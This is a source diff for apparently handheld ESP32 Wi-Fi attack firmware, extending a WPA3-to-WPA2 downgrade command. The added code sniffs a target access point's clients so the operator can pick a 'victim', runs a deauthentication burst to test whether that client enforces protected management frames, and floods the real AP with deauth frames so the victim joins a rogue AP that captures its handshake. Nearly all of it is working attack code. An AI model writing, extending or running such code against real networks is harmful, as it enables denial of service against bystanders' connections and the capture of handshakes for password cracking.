@@ -41,6 +41,7 @@
 #include <WiFi.h>
 #include <esp_wifi.h>
 #include <SD.h>
+#include <strings.h>
 #include "wpa3down.h"
 #include "display_manager.h"
 #include "input_handling.h"
@@ -48,6 +49,8 @@
 #include "sdcard_manager.h"
 #include "wifi_functions.h"
 #include "rogue_handshake.h"
+#include "dot11.h"
+#include "oui_lookup.h"
 #include "pcap_writer.h"
 
 extern DisplayManager displayManager;
@@ -56,6 +59,9 @@ extern WiFiFunctions  wifiFunctions;
 extern SDCardManager  sdCardManager;
 
 #define W3D_MAX_TD 32
+
+// Phase 3 — empirical PMF (802.11w) verdict for the target's victim client.
+enum W3dPmf { W3D_PMF_UNK = 0, W3D_PMF_OFF, W3D_PMF_ON };
 
 // ── helpers ─────────────────────────────────────────────────────────────────────
 
@@ -138,6 +144,387 @@ static void w3dBssidStr(const uint8_t* b, char* out) {
     snprintf(out, 18, "%02X:%02X:%02X:%02X:%02X:%02X", b[0], b[1], b[2], b[3], b[4], b[5]);
 }
 
+// ── Phase 3 Part 1: empirical PMF (802.11w) probe ─────────────────────────────────
+// Deciding whether an AP enforces PMF from its beacon flags is unreliable — a modern
+// client negotiates PMF even when the AP only marks it "capable". So we test the
+// *client* empirically: knock it with a directed deauth burst and watch, in
+// promiscuous, how the victim reacts on the real AP's channel:
+//   - it emits fresh auth / (re)assoc requests  → the deauth DROPPED it   → PMF OFF
+//   - its data frames to the AP keep flowing     → the deauth was IGNORED → PMF ON
+//   - it was idle / went silent with no re-auth  → INCONCLUSIVE
+// Single-radio, mostly passive with one short TX burst. Needs a victim MAC.
+// Method: IEEE 802.11-2016 §12 (PMF applies only AFTER association); pre-assoc
+// deauth-flood technique per eaphammer (already credited, NOTICES Dragonblood entry).
+
+static volatile uint32_t s_ppData, s_ppReauth, s_ppDeauth;
+static uint8_t s_ppVictim[6], s_ppBssid[6];
+
+static void IRAM_ATTR w3dProbeCb(void* buf, wifi_promiscuous_pkt_type_t t) {
+    const wifi_promiscuous_pkt_t* pp = (const wifi_promiscuous_pkt_t*)buf;
+    const uint8_t* d = pp->payload;
+    uint16_t len = pp->rx_ctrl.sig_len;
+    if (len < 24) return;
+    uint8_t ft = dot11::fType(d), st = dot11::fSubtype(d);
+    const uint8_t* a1 = d + 4;      // receiver / DA
+    const uint8_t* a2 = d + 10;     // transmitter / SA
+    if (ft == 0) {                                          // management
+        if (st == 11 || st == dot11::ST_ASSOC_REQ || st == 2) {   // auth / (re)assoc req
+            if (memcmp(a2, (const void*)s_ppVictim, 6) == 0 &&
+                memcmp(a1, (const void*)s_ppBssid, 6) == 0) s_ppReauth++;
+        } else if (st == dot11::ST_DEAUTH || st == dot11::ST_DISASSOC) {
+            if (memcmp(a1, (const void*)s_ppVictim, 6) == 0 ||
+                memcmp(a2, (const void*)s_ppVictim, 6) == 0) s_ppDeauth++;
+        }
+    } else if (ft == 2) {                                   // data — victim <-> real AP
+        if ((memcmp(a2, (const void*)s_ppVictim, 6) == 0 ||
+             memcmp(a1, (const void*)s_ppVictim, 6) == 0) &&
+            memcmp(dot11::dataBssid(d), (const void*)s_ppBssid, 6) == 0) s_ppData++;
+    }
+}
+
+// Small live line under the probe chrome. `data`/`reauth` are the live counters.
+static void w3dProbeLine(const char* phase, uint16_t phaseColor) {
+    int y = outputY + 5 * LINE_HEIGHT;
+    displayManager.fillRect(0, y - 1, SCREEN_WIDTH, 2 * LINE_HEIGHT, TFT_BLACK);
+    displayManager.setCursor(6, y);
+    displayManager.setTextColor(phaseColor); displayManager.printText(phase);
+    displayManager.setCursor(6, y + LINE_HEIGHT);
+    char l[40];
+    snprintf(l, sizeof(l), "data %lu   re-auth %lu",
+             (unsigned long)s_ppData, (unsigned long)s_ppReauth);
+    displayManager.setTextColor(TFT_WHITE); displayManager.printText(l);
+}
+
+// Timed wait that keeps the probe line live and honours [q]. Returns true if aborted.
+static bool w3dProbeWait(uint32_t ms, const char* phase, uint16_t color) {
+    uint32_t t0 = millis(), lastDraw = 0;
+    while (millis() - t0 < ms) {
+        if (!displayManager.isBlocked() && millis() - lastDraw > 200) {
+            w3dProbeLine(phase, color); lastDraw = millis();
+        }
+        char k = inputHandler.getKeyboardInput();
+        if (k == 'q' || k == 'Q') return true;
+        delay(10);
+    }
+    return false;
+}
+
+// Run the probe. Leaves WiFi idle STA (SD-safe). Fills detail[] with a summary.
+static W3dPmf w3dRunPmfProbe(const uint8_t* bssid, int ch, const uint8_t* victim,
+                             char* detail, size_t dn) {
+    memcpy((void*)s_ppVictim, victim, 6);
+    memcpy((void*)s_ppBssid, bssid, 6);
+    s_ppData = s_ppReauth = s_ppDeauth = 0;
+
+    // chrome
+    char bs[18], vs[18]; w3dBssidStr(bssid, bs); w3dBssidStr(victim, vs);
+    displayManager.clearScreen();
+    displayManager.setDefaultTextSize();
+    displayManager.setCursor(10, outputY);
+    displayManager.setTextColor(0x7BEF);     displayManager.printText("[");
+    displayManager.setTextColor(TFT_CYAN);   displayManager.printText("W3D");
+    displayManager.setTextColor(0x7BEF);     displayManager.printText("::");
+    displayManager.setTextColor(TFT_YELLOW); displayManager.printText("PMF-PROBE");
+    displayManager.setTextColor(0x7BEF);     displayManager.println("]");
+    displayManager.setCursor(10, outputY + LINE_HEIGHT);
+    displayManager.setTextColor(0x7BEF);   displayManager.printText("AP  ");
+    displayManager.setTextColor(TFT_WHITE); displayManager.println(bs);
+    displayManager.setCursor(10, outputY + 2 * LINE_HEIGHT);
+    displayManager.setTextColor(0x7BEF);   displayManager.printText("STA ");
+    displayManager.setTextColor(TFT_WHITE); displayManager.printText(vs);
+    char chs[10]; snprintf(chs, sizeof(chs), "  ch%d", ch);
+    displayManager.setTextColor(0x7BEF); displayManager.println(chs);
+    displayManager.setCursor(0, outputY + 3 * LINE_HEIGHT + 2); displayManager.printSeparator();
+    displayManager.setCursor(0, 210); displayManager.printSeparator();
+    displayManager.setCursor(6, 214);
+    displayManager.setTextColor(0x7BEF); displayManager.printText("[q] abort");
+    displayManager.setTextColor(TFT_WHITE);
+
+    // bring up promiscuous on the target channel
+    WiFi.disconnect(false);
+    WiFi.mode(WIFI_STA);
+    wifi_promiscuous_filter_t filt = {
+        .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA };
+    esp_wifi_set_promiscuous_filter(&filt);
+    esp_wifi_set_promiscuous(true);
+    esp_wifi_set_promiscuous_rx_cb(w3dProbeCb);
+    esp_wifi_set_channel((uint8_t)ch, WIFI_SECOND_CHAN_NONE);
+
+    bool aborted = false;
+
+    // Phase A — baseline (2 s): how active is the victim on the real AP?
+    aborted = w3dProbeWait(2000, "baseline...", TFT_CYAN);
+    uint32_t baseData     = s_ppData;
+    uint32_t reauthBefore = s_ppReauth;
+
+    // Phase B — deauth burst (~1.2 s): try to knock the victim off the real AP.
+    for (int i = 0; i < 8 && !aborted; i++) {
+        w3dDeauthDir(bssid, victim);      // directed pair (lands only if PMF off)
+        w3dDeauth(bssid);                 // + broadcast
+        aborted = w3dProbeWait(150, "deauth burst...", TFT_RED);
+    }
+    uint32_t postStart = s_ppData;
+
+    // Phase C — observe (2.5 s): reconnect? did data stop?
+    if (!aborted) aborted = w3dProbeWait(2500, "watching...", TFT_YELLOW);
+    uint32_t reauth   = s_ppReauth - reauthBefore;
+    uint32_t postData = s_ppData - postStart;
+
+    esp_wifi_set_promiscuous(false);
+    esp_wifi_set_promiscuous_rx_cb(nullptr);
+    WiFi.mode(WIFI_STA);
+
+    if (aborted) { if (dn) snprintf(detail, dn, "aborted"); return W3D_PMF_UNK; }
+
+    // Verdict. Fresh auth/assoc from the victim is the clean discriminator; failing
+    // that, sustained data through the burst = deauth ignored = PMF on.
+    if (reauth > 0) {
+        if (dn) snprintf(detail, dn, "re-auth x%lu after deauth", (unsigned long)reauth);
+        return W3D_PMF_OFF;
+    }
+    if (baseData < 4) {
+        if (dn) snprintf(detail, dn, "victim idle (%lu frames)", (unsigned long)baseData);
+        return W3D_PMF_UNK;
+    }
+    if (postData >= baseData / 2) {
+        if (dn) snprintf(detail, dn, "data flowed thru deauth (%lu/%lu)",
+                         (unsigned long)postData, (unsigned long)baseData);
+        return W3D_PMF_ON;
+    }
+    if (dn) snprintf(detail, dn, "traffic dropped, no re-auth seen");
+    return W3D_PMF_UNK;   // dropped but silent — can't confirm downgrade
+}
+
+// Show the verdict. probeOnly → any key returns (false). Attack path → any key
+// starts (true), [q] cancels (false).
+static bool w3dShowVerdict(const char* ssid, W3dPmf pmf, const char* det, bool probeOnly) {
+    displayManager.clearScreen();
+    displayManager.setDefaultTextSize();
+    displayManager.setCursor(10, outputY);
+    displayManager.setTextColor(0x7BEF);     displayManager.printText("[");
+    displayManager.setTextColor(TFT_CYAN);   displayManager.printText("W3D");
+    displayManager.setTextColor(0x7BEF);     displayManager.printText("::");
+    displayManager.setTextColor(TFT_YELLOW); displayManager.printText("PMF");
+    displayManager.setTextColor(0x7BEF);     displayManager.println("]");
+    displayManager.setCursor(10, outputY + LINE_HEIGHT);
+    displayManager.setTextColor(0x7BEF);   displayManager.printText("Target: ");
+    displayManager.setTextColor(TFT_WHITE); displayManager.println(ssid[0] ? ssid : "<hidden>");
+
+    displayManager.setCursor(10, outputY + 3 * LINE_HEIGHT);
+    if (pmf == W3D_PMF_OFF) {
+        displayManager.setTextColor(TFT_GREEN);
+        displayManager.println("PMF OFF - downgrade should work");
+    } else if (pmf == W3D_PMF_ON) {
+        displayManager.setTextColor(TFT_RED);
+        displayManager.println("PMF ON - deauth blocked");
+        displayManager.setCursor(10, outputY + 4 * LINE_HEIGHT);
+        displayManager.setTextColor(TFT_YELLOW);
+        displayManager.println("pre-assoc flood only (disrupts re-joins)");
+    } else {
+        displayManager.setTextColor(TFT_YELLOW);
+        displayManager.println("INCONCLUSIVE");
+    }
+    displayManager.setCursor(10, outputY + 5 * LINE_HEIGHT);
+    displayManager.setTextColor(0x7BEF); displayManager.println(det);
+
+    displayManager.setCursor(0, 210); displayManager.printSeparator();
+    displayManager.setCursor(6, 214);
+    displayManager.setTextColor(0x7BEF);
+    displayManager.printText(probeOnly ? "[any] back" : "[q] cancel   any key = start attack");
+    displayManager.setTextColor(TFT_WHITE);
+
+    while (true) {
+        char k = inputHandler.getKeyboardInput();
+        if (!k) {
+            if (LockScreenManager::getInstance().consumeJustUnlocked()) { /* stays */ }
+            delay(20); continue;
+        }
+        if (probeOnly) return false;
+        if (k == 'q' || k == 'Q') return false;
+        return true;
+    }
+}
+
+// ── Phase 3: client auto-discovery (pick a victim without typing a MAC) ───────────
+// Sniff the target AP's channel for data frames to/from its BSSID → the STA MACs are
+// its active clients (wm's client-detection logic). Freeze the list and let the
+// operator trackball-pick one, or [a] auto-pick the busiest — so `w3d`/`w3d probe`
+// never need a hand-typed victim MAC. Reuses dot11 + oui_lookup + the picker style.
+#define W3D_MAX_CL 16
+
+struct W3dClient { uint8_t mac[6]; uint16_t hits; int8_t rssi; };
+
+struct W3dClEvt { uint8_t mac[6]; int8_t rssi; };
+#define W3D_CL_RING 24
+static volatile W3dClEvt s_clRing[W3D_CL_RING];
+static volatile uint8_t  s_clHead, s_clTail;
+static uint8_t           s_clBssid[6];
+
+static void IRAM_ATTR w3dClientCb(void* buf, wifi_promiscuous_pkt_type_t t) {
+    const wifi_promiscuous_pkt_t* pp = (const wifi_promiscuous_pkt_t*)buf;
+    const uint8_t* d = pp->payload;
+    uint16_t len = pp->rx_ctrl.sig_len;
+    if (len < 24 || dot11::fType(d) != 2) return;         // data frames = active clients
+    bool td = dot11::toDS(d), fd = dot11::fromDS(d);
+    const uint8_t* cli = nullptr;
+    if (td && !fd)      { if (memcmp(d + 4,  (const void*)s_clBssid, 6) == 0) cli = d + 10; } // STA->AP
+    else if (fd && !td) { if (memcmp(d + 10, (const void*)s_clBssid, 6) == 0) cli = d + 4;  } // AP->STA
+    if (!cli || (cli[0] & 0x01)) return;                  // none / multicast
+    uint8_t nx = (s_clHead + 1) % W3D_CL_RING;
+    if (nx == s_clTail) return;
+    W3dClEvt& e = (W3dClEvt&)s_clRing[s_clHead];
+    memcpy(e.mac, cli, 6); e.rssi = pp->rx_ctrl.rssi;
+    s_clHead = nx;
+}
+
+// Sniff ~5 s, draining the ring into `tbl` (dedup by MAC, hits/rssi tracked).
+// Returns client count, or -1 if the operator pressed [q]. Leaves promiscuous OFF.
+static int w3dSniffClients(int ch, W3dClient* tbl) {
+    s_clHead = s_clTail = 0;
+    WiFi.disconnect(false);
+    WiFi.mode(WIFI_STA);
+    wifi_promiscuous_filter_t filt = { .filter_mask = WIFI_PROMIS_FILTER_MASK_DATA };
+    esp_wifi_set_promiscuous_filter(&filt);
+    esp_wifi_set_promiscuous(true);
+    esp_wifi_set_promiscuous_rx_cb(w3dClientCb);
+    esp_wifi_set_channel((uint8_t)ch, WIFI_SECOND_CHAN_NONE);
+
+    int n = 0; bool aborted = false;
+    uint32_t t0 = millis(), lastDraw = 0;
+    while (millis() - t0 < 5000) {
+        while (s_clTail != s_clHead) {
+            W3dClEvt e; memcpy(&e, (const void*)&s_clRing[s_clTail], sizeof(e));
+            s_clTail = (s_clTail + 1) % W3D_CL_RING;
+            int idx = -1;
+            for (int i = 0; i < n; i++) if (memcmp(tbl[i].mac, e.mac, 6) == 0) { idx = i; break; }
+            if (idx < 0 && n < W3D_MAX_CL) { idx = n++; memcpy(tbl[idx].mac, e.mac, 6); tbl[idx].hits = 0; }
+            if (idx >= 0) { tbl[idx].hits++; tbl[idx].rssi = e.rssi; }
+        }
+        if (!displayManager.isBlocked() && millis() - lastDraw > 250) {
+            int y = outputY + 5 * LINE_HEIGHT;
+            displayManager.fillRect(0, y - 1, SCREEN_WIDTH, LINE_HEIGHT, TFT_BLACK);
+            displayManager.setCursor(6, y);
+            char l[40];
+            snprintf(l, sizeof(l), "found %d   %lus left", n,
+                     (unsigned long)((5000 - (millis() - t0)) / 1000));
+            displayManager.setTextColor(TFT_WHITE); displayManager.printText(l);
+            lastDraw = millis();
+        }
+        char k = inputHandler.getKeyboardInput();
+        if (k == 'q' || k == 'Q') { aborted = true; break; }
+        delay(10);
+    }
+    esp_wifi_set_promiscuous(false);
+    esp_wifi_set_promiscuous_rx_cb(nullptr);
+    WiFi.mode(WIFI_STA);
+    if (aborted) return -1;
+    // sort busiest-first (insertion; <=16 rows)
+    for (int i = 1; i < n; i++) {
+        W3dClient tmp = tbl[i]; int j = i - 1;
+        while (j >= 0 && tbl[j].hits < tmp.hits) { tbl[j + 1] = tbl[j]; j--; }
+        tbl[j + 1] = tmp;
+    }
+    return n;
+}
+
+static void w3dDrawClientList(const W3dClient* tbl, int n, int sel) {
+    displayManager.clearScreen();
+    displayManager.setDefaultTextSize();
+    displayManager.setCursor(10, outputY);
+    displayManager.setTextColor(0x7BEF);     displayManager.printText("[");
+    displayManager.setTextColor(TFT_CYAN);   displayManager.printText("W3D");
+    displayManager.setTextColor(0x7BEF);     displayManager.printText("::");
+    displayManager.setTextColor(TFT_YELLOW); displayManager.printText("CLIENT");
+    displayManager.setTextColor(0x7BEF);     displayManager.println("]");
+    displayManager.setCursor(10, outputY + LINE_HEIGHT);
+    displayManager.setTextColor(0x7BEF);
+    displayManager.println(n == 0 ? "No active clients seen." : "Pick the victim client:");
+    displayManager.setCursor(0, outputY + 2 * LINE_HEIGHT + 2);
+    displayManager.printSeparator();
+
+    int listTop = outputY + 3 * LINE_HEIGHT;
+    for (int k = 0; k < n && k < 8; k++) {
+        int y = listTop + k * LINE_HEIGHT;
+        bool srow = (k == sel);
+        if (srow) displayManager.fillRect(0, y - 1, SCREEN_WIDTH, LINE_HEIGHT, 0x0841);
+        displayManager.setCursor(2, y);
+        displayManager.setTextColor(srow ? TFT_YELLOW : 0x7BEF);
+        displayManager.printText(srow ? ">" : " ");
+        char mac[18]; w3dBssidStr(tbl[k].mac, mac);
+        displayManager.setTextColor(TFT_WHITE); displayManager.printText(mac);
+        const char* ven = ouiVendor(tbl[k].mac);   // nullptr for unknown OUIs
+        char meta[24];
+        snprintf(meta, sizeof(meta), " %-7.7s %d", ven ? ven : "?", tbl[k].rssi);
+        displayManager.setTextColor(0x7BEF); displayManager.printText(meta);
+    }
+    displayManager.setCursor(0, 210);
+    displayManager.printSeparator();
+    displayManager.setCursor(6, 214);
+    displayManager.setTextColor(0x7BEF);
+    displayManager.printText(n == 0 ? "[u]rescan  [b]broadcast  [q]cancel"
+                                    : "trkbl/ent pick [a]auto [u]resc [b]bcast [q]");
+    displayManager.setTextColor(TFT_WHITE);
+}
+
+// Discover the target AP's clients and pick one. Returns 1 = client picked (out set),
+// 0 = fall back to broadcast (no victim), -1 = cancelled. `autoPick` skips the picker
+// and takes the busiest client when any are found.
+static int w3dPickClient(const uint8_t* bssid, int ch, bool autoPick, uint8_t* out) {
+    memcpy(s_clBssid, bssid, 6);
+    W3dClient tbl[W3D_MAX_CL];
+
+    // sniff chrome (kept behind the live "found N" line drawn by w3dSniffClients)
+    displayManager.clearScreen();
+    displayManager.setCursor(10, outputY);
+    displayManager.setTextColor(0x7BEF);     displayManager.printText("[");
+    displayManager.setTextColor(TFT_CYAN);   displayManager.printText("W3D");
+    displayManager.setTextColor(0x7BEF);     displayManager.printText("::");
+    displayManager.setTextColor(TFT_YELLOW); displayManager.printText("SNIFF");
+    displayManager.setTextColor(0x7BEF);     displayManager.println("]");
+    displayManager.setCursor(10, outputY + LINE_HEIGHT);
+    displayManager.setTextColor(0x7BEF);     displayManager.println("Finding clients on the AP...");
+    displayManager.setCursor(0, 210); displayManager.printSeparator();
+    displayManager.setCursor(6, 214);
+    displayManager.setTextColor(0x7BEF); displayManager.printText("[q] abort");
+    displayManager.setTextColor(TFT_WHITE);
+
+    int n = w3dSniffClients(ch, tbl);
+    if (n < 0) return -1;                                  // aborted mid-sniff
+    if (autoPick && n > 0) { memcpy(out, tbl[0].mac, 6); return 1; }
+
+    int  sel = 0;
+    bool redraw = true;
+    while (true) {
+        int vis = n < 8 ? n : 8;                          // only the top 8 are shown/pickable
+        if (redraw) { w3dDrawClientList(tbl, n, sel); redraw = false; }
+
+        TrackballEvent tb = inputHandler.getTrackballEvent();
+        if (tb == TBALL_UP)    { if (sel > 0)       { sel--; redraw = true; } continue; }
+        if (tb == TBALL_DOWN)  { if (sel < vis - 1) { sel++; redraw = true; } continue; }
+        if (tb == TBALL_CLICK) { if (n > 0) { memcpy(out, tbl[sel].mac, 6); return 1; } continue; }
+
+        char k = inputHandler.getKeyboardInput();
+        if (!k) { if (LockScreenManager::getInstance().consumeJustUnlocked()) redraw = true; continue; }
+        if (k == '\r' || k == '\n' || k == 'a' || k == 'A') {
+            int pick = (k == 'a' || k == 'A') ? 0 : sel;
+            if (n > 0) { memcpy(out, tbl[pick].mac, 6); return 1; }
+            continue;
+        }
+        if (k == 'u' || k == 'U') {
+            displayManager.clearScreen();
+            displayManager.setCursor(10, outputY + LINE_HEIGHT);
+            displayManager.setTextColor(0x7BEF); displayManager.println("Re-sniffing clients...");
+            displayManager.setTextColor(TFT_WHITE);
+            n = w3dSniffClients(ch, tbl);
+            if (n < 0) return -1;
+            if (sel >= n) sel = 0;
+            redraw = true; continue;
+        }
+        if (k == 'b' || k == 'B') return 0;               // broadcast, no victim
+        if (k == 'q' || k == 'Q') return -1;
+    }
+}
+
 // ── target picker (TD-filtered last-scan list) ───────────────────────────────────
 
 static int w3dPickTarget(const int* tdIdx, int tdCount) {
@@ -203,7 +590,7 @@ static int w3dPickTarget(const int* tdIdx, int tdCount) {
 
 // ── attack screen drawing ─────────────────────────────────────────────────────────
 
-static void w3dDrawChrome(const char* ssid, const uint8_t* bssid, int ch, bool pmfWarn,
+static void w3dDrawChrome(const char* ssid, const uint8_t* bssid, int ch, W3dPmf pmf,
                           const uint8_t* victim) {
     char bs[18]; w3dBssidStr(bssid, bs);
     displayManager.clearScreen();
@@ -243,10 +630,16 @@ static void w3dDrawChrome(const char* ssid, const uint8_t* bssid, int ch, bool p
         displayManager.println("Deauth: broadcast (add victim MAC)");
     }
 
-    if (pmfWarn) {
-        displayManager.setCursor(6, outputY + 8 * LINE_HEIGHT);
+    displayManager.setCursor(6, outputY + 8 * LINE_HEIGHT);
+    if (pmf == W3D_PMF_ON) {
+        displayManager.setTextColor(TFT_RED);
+        displayManager.println("Mode: PRE-ASSOC FLOOD (PMF on)");
+    } else if (pmf == W3D_PMF_OFF) {
+        displayManager.setTextColor(TFT_GREEN);
+        displayManager.println("Mode: DEAUTH DOWNGRADE (PMF off)");
+    } else {
         displayManager.setTextColor(TFT_YELLOW);
-        displayManager.println("PMF/transition-disable may block drop");
+        displayManager.println("PMF unknown - may not drop");
     }
 
     displayManager.setCursor(0, 210);
@@ -296,14 +689,31 @@ void runWpa3Down(char* args) {
     for (int i = 0; i < total && tdCount < W3D_MAX_TD; i++)
         if (wifiFunctions.getNetworkSec(i) == WSEC_TD) tdIdx[tdCount++] = i;
 
-    // Optional victim MAC (`w3d [idx] <aa:bb:cc:dd:ee:ff>`) → directed deauth.
-    uint8_t victim[6]; bool hasVictim = (args && *args) && w3dParseMac(args, victim);
+    // Strip leading `probe` / `auto` tokens (any order):
+    //   probe = PMF recon only (no attack); auto = auto-pick the busiest client.
+    bool  probeOnly = false, autoPick = false;
+    char* rest = args;
+    if (rest) {
+        while (*rest == ' ') rest++;
+        for (;;) {
+            if (strncasecmp(rest, "probe", 5) == 0 && (rest[5] == ' ' || rest[5] == '\0')) {
+                probeOnly = true; rest += 5; while (*rest == ' ') rest++; continue;
+            }
+            if (strncasecmp(rest, "auto", 4) == 0 && (rest[4] == ' ' || rest[4] == '\0')) {
+                autoPick = true; rest += 4; while (*rest == ' ') rest++; continue;
+            }
+            break;
+        }
+    }
+
+    // Optional victim MAC (`w3d [idx] <aa:bb:cc:dd:ee:ff>`) → directed deauth + PMF probe.
+    uint8_t victim[6]; bool hasVictim = (rest && *rest) && w3dParseMac(rest, victim);
 
     // Resolve the target: explicit `w3d <index>` (any sec), else the TD picker.
     // Only treat a leading numeric token as the index — a MAC arg must not be read as one.
     int target = -1;
-    if (args && *args) {
-        const char* s = args; while (*s == ' ') s++;
+    if (rest && *rest) {
+        const char* s = rest; while (*s == ' ') s++;
         bool tokIsMac = false;
         for (const char* t = s; *t && *t != ' '; t++) if (*t == ':') { tokIsMac = true; break; }
         if (!tokIsMac && isdigit((unsigned char)*s)) {
@@ -348,7 +758,37 @@ void runWpa3Down(char* args) {
         displayManager.printCommandScreen();
         return;
     }
-    bool pmfWarn = (wifiFunctions.getNetworkSec(target) != WSEC_OPEN);  // TD/others may have PMF
+    // ── Phase 3: auto-discover a victim client (no MAC typing) ─────────────────────
+    // No explicit MAC → sniff the AP's clients and pick one (or [a]/auto = busiest).
+    if (!hasVictim) {
+        int r = w3dPickClient(bssid, ch, autoPick, victim);
+        if (r < 0) { displayManager.printCommandScreen(); return; }   // cancelled
+        if (r == 1) hasVictim = true;                                 // picked a client
+        // r == 0 → operator chose broadcast (no victim)
+    }
+
+    // A PMF probe needs a target client to observe.
+    if (probeOnly && !hasVictim) {
+        displayManager.clearScreen();
+        displayManager.setCursor(10, outputY);
+        displayManager.setTextColor(TFT_YELLOW);
+        displayManager.println("PMF probe needs a client.");
+        displayManager.setCursor(10, displayManager.getCursorY());
+        displayManager.setTextColor(0x7BEF);
+        displayManager.println("Pick one, or w3d probe <idx> <mac>.");
+        displayManager.setTextColor(TFT_WHITE);
+        displayManager.printCommandScreen();
+        return;
+    }
+
+    // ── empirical PMF probe (runs whenever we have a victim) ───────────────────────
+    W3dPmf pmf = W3D_PMF_UNK;
+    if (hasVictim) {
+        char det[48];
+        pmf = w3dRunPmfProbe(bssid, ch, victim, det, sizeof(det));
+        bool go = w3dShowVerdict(ssid, pmf, det, probeOnly);
+        if (probeOnly || !go) { displayManager.printCommandScreen(); return; }
+    }
 
     // ── stand up the WPA2-only rogue AP (roguehs) on the target's channel ──────────
     if (!roguehs::begin(ssid, (uint8_t)ch)) {
@@ -361,27 +801,37 @@ void runWpa3Down(char* args) {
         return;
     }
 
-    w3dDrawChrome(ssid, bssid, ch, pmfWarn, hasVictim ? victim : nullptr);
+    w3dDrawChrome(ssid, bssid, ch, pmf, hasVictim ? victim : nullptr);
 
     uint32_t t0 = millis(), lastDeauth = 0, lastDraw = 0, deauths = 0;
+    uint32_t lastEng = 0, lastEngMs = 0;
     bool captured = false;
     while (true) {
         roguehs::poll();                                   // service rogue AP + sniff M2
+        const roguehs::State& st = roguehs::state();
 
-        // Continuous deauth FLOOD (~50/s) — make the real AP unusable so the victim
-        // is forced onto our rogue even when the real AP has the stronger signal.
-        if (millis() - lastDeauth >= 20) {
+        // Pre-association-aware deauth FLOOD (~50/s): hammer the real AP so the victim
+        // can't stay on / re-join it — but YIELD the air the instant a client is in the
+        // auth/assoc handshake with OUR rogue, so the tight TX loop doesn't starve the
+        // rogue's auth-resp/assoc-resp/M1 (resume-plan #2). Key off auths+assocs only —
+        // NOT probes, which climb from any nearby scanner and would suppress deauth forever.
+        // Against a PMF-required client this can't drop an established link — it only
+        // disrupts its next (re)association attempt (pre-assoc frames aren't PMF-protected).
+        uint32_t eng = st.auths + st.assocs;
+        if (eng != lastEng) { lastEng = eng; lastEngMs = millis(); }
+        bool joining = lastEngMs && (millis() - lastEngMs < 400);
+        if (!joining && millis() - lastDeauth >= 20) {
             w3dDeauth(bssid);                              // broadcast
             if (hasVictim) w3dDeauthDir(bssid, victim);    // directed pair (effective when PMF off)
             deauths++; lastDeauth = millis();
         }
 
-        if (roguehs::state().gotM2) { captured = true; break; }
+        if (st.gotM2) { captured = true; break; }
 
         if (LockScreenManager::getInstance().consumeJustUnlocked())
-            w3dDrawChrome(ssid, bssid, ch, pmfWarn, hasVictim ? victim : nullptr);
+            w3dDrawChrome(ssid, bssid, ch, pmf, hasVictim ? victim : nullptr);
         if (!displayManager.isBlocked() && millis() - lastDraw > 250) {
-            w3dDrawStats(roguehs::state(), deauths, millis() - t0);
+            w3dDrawStats(st, deauths, millis() - t0);
             lastDraw = millis();
         }
 
